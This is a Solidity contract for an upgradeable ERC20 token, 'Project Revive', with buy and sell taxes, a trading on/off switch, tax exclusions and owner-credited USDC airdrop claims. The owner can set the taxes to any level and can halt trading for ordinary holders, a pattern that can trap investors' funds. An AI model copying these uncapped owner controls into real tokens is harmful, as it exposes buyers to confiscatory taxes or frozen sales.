// SPDX-License-Identifier: GPL-1.0-or-later
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract ReviveERC20 is ERC20Upgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable {

    address public pair;

    address public taxReceiver;

    uint256 public airdropTime;

    uint256 public buyTax;
    uint256 public sellTax;

    uint256 public totalDistributed;

    IERC20 public usdc;

    mapping(address => bool) public isExcludedFromTax;

    mapping(address => uint256) public claimable;
    mapping(address => uint256) public earnedInTotal;
    mapping(uint256 => mapping(address => uint256)) public earnedByAirDropTime;

    bool tradingEnabled;

    function initialize(address _usdc) public initializer {
        __ERC20_init("Project Revive", "REV");
        __Ownable_init();

        usdc = IERC20(_usdc);
        
        isExcludedFromTax[address(0)] = true;
        isExcludedFromTax[0x000000000000000000000000000000000000dEaD] = true;
        isExcludedFromTax[msg.sender] = true;
        isExcludedFromTax[0x5b50BEC29E52C1EEbd2cAdB3e83584cB4bcdBAe4] = true;

        _mint(0x5b50BEC29E52C1EEbd2cAdB3e83584cB4bcdBAe4, 100_000 ether);

        buyTax = 12;
        sellTax = 16;

        taxReceiver = 0x5b50BEC29E52C1EEbd2cAdB3e83584cB4bcdBAe4;
    }


    //Admin part

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    /* function mint(address _to, uint256 _amount) external onlyOwner {
        _mint(_to, _amount);
    } */

    function setBuyTax(uint256 _tax) external onlyOwner {
        buyTax = _tax;
    }

    function setSellTax(uint256 _tax) external onlyOwner {
        sellTax = _tax;
    }

    function setTaxReceiver(address _taxReceiver) external onlyOwner {
        taxReceiver = _taxReceiver;

        isExcludedFromTax[_taxReceiver] = true;
    }

    function setIsExcudedFromTax(address _address, bool _isExcluded) external onlyOwner {
        isExcludedFromTax[_address] = _isExcluded;
    }

    function setTradingEnabled(bool _tradingEnabled) external onlyOwner {
        tradingEnabled = _tradingEnabled;
    }



    //Tax part

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 taxAmount;

        if (isExcludedFromTax[from] == false && isExcludedFromTax[to] == false) {
            if (from == pair) {
                require(tradingEnabled == true, "Trading is not enabled yet");
                taxAmount = amount * buyTax / 100;
            } else if (to == pair) {
                require(tradingEnabled == true, "Trading is not enabled yet");
                taxAmount = amount * sellTax / 100;
            }

            /* if (to != pair) {
                require(balanceOf(to) + (amount - taxAmount) <= balanceOf(pair) * 5 / 100, "ERC20: amount exceed max holdings limit");
            } */
        }



        if (taxAmount > 0) {
            super._transfer(from, taxReceiver, taxAmount);
        }
       
        super._transfer(from, to, amount - taxAmount);
    }


    //Dividend Part

    function airdrop(uint256 phase, address[] memory people, uint256[] memory amount) external onlyOwner {
        for (uint256 i = 0; i < people.length; i++) {
            earnedByAirDropTime[phase][people[i]] += amount[i];
            earnedInTotal[people[i]] += amount[i];
            claimable[people[i]] += amount[i];

            totalDistributed += amount[i];
        }
    }

    function getSharePool(address user) external view returns (uint256) {
        return balanceOf(user) * 1 ether / (totalSupply() - balanceOf(0x000000000000000000000000000000000000dEaD) - balanceOf(pair));
    }

    function getClaimable(address user) external view returns (uint256) {
        return claimable[user];
    }

    function claim() external nonReentrant {
        require(claimable[msg.sender] > 0, "Nothing to claim");

        usdc.transfer(msg.sender, claimable[msg.sender]);

        claimable[msg.sender] = 0;
    }


    //Other

    function getBurnedToken() external view returns (uint256) {
        return balanceOf(0x000000000000000000000000000000000000dEaD);
    }
}